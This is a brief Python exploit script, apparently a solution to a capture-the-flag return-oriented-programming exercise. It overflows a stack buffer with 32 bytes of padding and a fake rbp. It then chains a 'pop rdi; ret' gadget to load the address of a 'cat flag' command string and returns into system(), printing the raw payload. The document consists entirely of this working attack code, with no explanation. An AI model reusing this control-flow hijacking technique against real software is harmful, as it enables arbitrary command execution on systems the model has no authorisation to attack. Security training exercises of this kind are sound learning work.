#!/usr/bin/env python

import struct
import sys

padding_len = 32 #until just before rbp is overwritten

rbp = struct.pack("L", 0xdeadbeef)

sym_cat_flag_str = struct.pack("L", 0x601060)
sym_system = struct.pack("L", 0x400560)

gad_pop_rbp_ret = struct.pack("L", 0x400618)
gad_pop_rdi_ret = struct.pack("L", 0x4007c3)

payload = b'A'*padding_len
payload += rbp
payload += gad_pop_rdi_ret
payload += sym_cat_flag_str
payload += sym_system

sys.stdout.buffer.write(payload)
